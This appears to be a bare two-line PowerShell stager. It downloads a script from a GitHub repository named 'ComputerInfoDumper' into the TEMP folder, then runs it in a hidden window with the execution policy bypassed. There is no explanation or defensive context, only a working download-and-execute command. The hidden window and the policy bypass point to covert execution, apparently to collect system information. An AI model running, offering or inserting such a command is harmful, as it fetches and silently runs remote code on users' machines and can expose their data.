iwr -useb "https://raw.githubusercontent.com/dazd-pkz/ComputerInfoDumper/main/ssg-008.ps1" -o $env:TEMP\script.ps1
saps cmd.exe "$env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe -executionpolicy bypass $env:TEMP\script.ps1" -WindowStyle Hidden
